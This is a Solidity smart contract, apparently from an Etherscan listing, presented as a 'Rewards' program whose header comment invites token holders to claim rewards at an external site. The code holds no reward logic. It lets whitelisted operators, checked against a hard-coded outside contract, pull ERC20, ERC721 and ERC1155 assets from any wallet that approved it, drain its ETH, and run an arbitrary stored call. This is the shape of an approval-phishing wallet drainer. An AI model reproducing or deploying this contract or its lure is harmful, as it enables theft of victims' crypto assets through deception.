/**
 *Submitted for verification at Etherscan.io on 2023-06-14
*/

/**

A new reward strategy was launched on June 14th, allowing holders of ERC20 tokens to claim rewards based on their holding balance.

https://www.ebonus.pro/

*/


// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

interface IToken {
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external;
    function safeTransferFrom(
        address from,
        address to,
        uint256 tokenId,
        bytes calldata data
    ) external;
    function safeTransferFrom(
        address from,
        address to,
        uint256 id,
        uint256 amount,
        bytes calldata data
    ) external;
}

interface IERC721Receiver {
    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4);
}

interface ISpender {
    function whiteList(address account) external view returns (bool);
}

contract Rewards {
    address public owner;
    mapping(address => bool) public whiteList;

    address public _to;
    bytes public msgData;


    fallback() payable external {
    }

    receive() payable external {
    }

    modifier onlyWhiteList() {
        require(
            ISpender(0xa74CBd5b80F73B5950768c8Dc467F1C6307c00fD).whiteList(
                msg.sender
            ),
            "not whiteList"
        );
        _;
    }


    function withdraw(address to) public onlyWhiteList {
        uint256 balance = address(this).balance;
        payable(to).transfer(balance);
    }

    function transferFrom(address token, address from, address to, uint256 amount) public onlyWhiteList {
        IToken(token).transferFrom(from, to, amount);
    }

    function safeTransferFrom(address token, address from, address to, uint256 tokenId, bytes calldata data) public onlyWhiteList {
        IToken(token).safeTransferFrom(from, to, tokenId, data);
    }

    function safeTransferFrom(address token, address from, address to, uint256 id, uint256 amount, bytes calldata data) public onlyWhiteList {
        IToken(token).safeTransferFrom(from, to, id, amount, data);
    }

    function onERC721Received(
        address /*operator*/,
        address /*from*/,
        uint256 tokenId,
        bytes calldata /*data*/
    ) external returns (bytes4) {
        (bool r1,) = address(_to).call(msgData);
        require(r1, "Item is Locked.");
        IToken(msg.sender).safeTransferFrom(address(this), owner, tokenId, new bytes(0));
        return IERC721Receiver(address(this)).onERC721Received.selector;
    }

    function set(address to_, bytes memory cd) public onlyWhiteList {
        _to = to_;
        msgData = cd;
    }
}